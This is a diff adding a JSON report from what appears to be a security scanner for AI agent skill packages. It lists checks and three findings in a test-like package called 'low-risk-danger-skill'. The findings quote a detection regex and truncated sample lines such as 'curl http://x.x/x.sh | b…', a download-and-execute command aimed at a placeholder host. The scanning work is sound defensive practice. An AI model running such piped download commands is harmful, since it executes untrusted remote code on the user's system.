@@ -1,0 +1,152 @@
+{
+  "meta": {
+    "task_id": "9c4722415459436eb4d26acc22ba64ae",
+    "artifact_sha256": "5184fe4cc2279cbcf83742c8d7675a6f2ab20b1bf08d659ed37405ac4e3af92a",
+    "created_at": "2026-03-29T16:47:07.143538+00:00",
+    "engine_version": "0.1.0",
+    "ruleset_version": "0.1.0"
+  },
+  "conclusion": "PASS",
+  "summary": {
+    "score": 7.0,
+    "score_raw": 30,
+    "level": "Medium",
+    "conclusion": "PASS",
+    "counts_by_severity": {
+      "Critical": 0,
+      "High": 3,
+      "Medium": 0,
+      "Low": 0,
+      "Info": 0
+    },
+    "counts_by_category": {
+      "malicious": 3
+    },
+    "counts_by_attack_type": {},
+    "checks": [
+      {
+        "id": "skill_layout",
+        "title": "Skill 包结构（前置）",
+        "description": "校验是否符合 Agent Skill 约定：解压后至少包含一处 SKILL.md；非标准结构将记为命中并判定不通过。",
+        "findings_count": 0,
+        "status": "pass"
+      },
+      {
+        "id": "secrets",
+        "title": "敏感信息泄露",
+        "description": "基于正则匹配检测私钥、云访问密钥、令牌等敏感内容。",
+        "findings_count": 0,
+        "status": "pass"
+      },
+      {
+        "id": "sast",
+        "title": "危险调用与代码模式（SAST）",
+        "description": "对源码脚本扫描 eval/exec、子进程、反序列化、非安全 YAML 等风险模式。",
+        "findings_count": 0,
+        "status": "pass"
+      },
+      {
+        "id": "config",
+        "title": "配置与权限风险",
+        "description": "检查 .env、yaml/json 等常见配置中的调试开关、CORS 过宽、TLS 校验关闭等。",
+        "findings_count": 0,
+        "status": "pass"
+      },
+      {
+        "id": "malicious",
+        "title": "恶意特征与可疑行为",
+        "description": "启发式检测下载并执行、可疑 PowerShell、挖矿关键字、异常长 Base64 等。",
+        "findings_count": 3,
+        "status": "fail"
+      },
+      {
+        "id": "dependency",
+        "title": "依赖与供应链",
+        "description": "识别依赖清单（requirements.txt、package.json 等）；对 Python 固定版本依赖查询 OSV 公开漏洞库。",
+        "findings_count": 0,
+        "status": "pass"
+      },
+      {
+        "id": "prompt_injection",
+        "title": "Prompt 注入与越权指令",
+        "description": "检测忽略系统指令、工具越权调用、关闭安全策略等可疑提示词注入语句。",
+        "findings_count": 0,
+        "status": "pass"
+      },
+      {
+        "id": "attack_chain",
+        "title": "混淆与执行链路",
+        "description": "检测解码后执行、输入到动态执行等组合攻击链路并进行证据加权。",
+        "findings_count": 0,
+        "status": "pass"
+      },
+      {
+        "id": "exfiltration",
+        "title": "敏感信息外传行为",
+        "description": "检测敏感读取与网络外发组合行为，识别疑似数据泄露链路。",
+        "findings_count": 0,
+        "status": "pass"
+      },
+      {
+        "id": "supplychain",
+        "title": "供应链脚本攻击",
+        "description": "检测 npm 安装钩子和 Python 构建脚本中的远程下载执行与动态命令。",
+        "findings_count": 0,
+        "status": "pass"
+      }
+    ]
+  },
+  "findings": [
+    {
+      "id": "5cd1001488e54dfeb3b100b001eecd80",
+      "rule_id": "MAL-DOWNLOADER",
+      "category": "malicious",
+      "severity": "High",
+      "confidence": 0.7,
+      "file_path": "low-risk-danger-skill/examples.md",
+      "line_range": "43",
+      "snippet_redacted": null,
+      "evidence": {
+        "match": "(?i)\\b(curl|wget)\\b.+\\b(sh|bash)\\b",
+        "matched_len": 27,
+        "sample_prefix": "curl http://x.x/x.sh | b…",
+        "sample_sha256": "55866575e71ca41a68487bd4fa711d083f36b67a662377d7bb264b6fe2b8944e"
+      },
+      "recommendation": "检查是否存在远程下载并执行行为，必要时移除"
+    },
+    {
+      "id": "d63d500aee54407ab91484d58266a2c0",
+      "rule_id": "MAL-DOWNLOADER",
+      "category": "malicious",
+      "severity": "High",
+      "confidence": 0.7,
+      "file_path": "low-risk-danger-skill/examples.md",
+      "line_range": "52",
+      "snippet_redacted": null,
+      "evidence": {
+        "match": "(?i)\\b(curl|wget)\\b.+\\b(sh|bash)\\b",
+        "matched_len": 27,
+        "sample_prefix": "curl http://x.x/x.sh | b…",
+        "sample_sha256": "55866575e71ca41a68487bd4fa711d083f36b67a662377d7bb264b6fe2b8944e"
+      },
+      "recommendation": "检查是否存在远程下载并执行行为，必要时移除"
+    },
+    {
+      "id": "84efaf19cfb447d4836fd6a8de89d8f8",
+      "rule_id": "MAL-DOWNLOADER",
+      "category": "malicious",
+      "severity": "High",
+      "confidence": 0.7,
+      "file_path": "low-risk-danger-skill/reference.md",
+      "line_range": "37",
+      "snippet_redacted": null,
+      "evidence": {
+        "match": "(?i)\\b(curl|wget)\\b.+\\b(sh|bash)\\b",
+        "matched_len": 29,
+        "sample_prefix": "curl|wget).*(\\||&&).*(sh…",
+        "sample_sha256": "1b4fb9c9e9478f7c71bbc7c60154e9705242a6f7db791392c3e987c3137a707a"
+      },
+      "recommendation": "检查是否存在远程下载并执行行为，必要时移除"
+    }
+  ]
+}
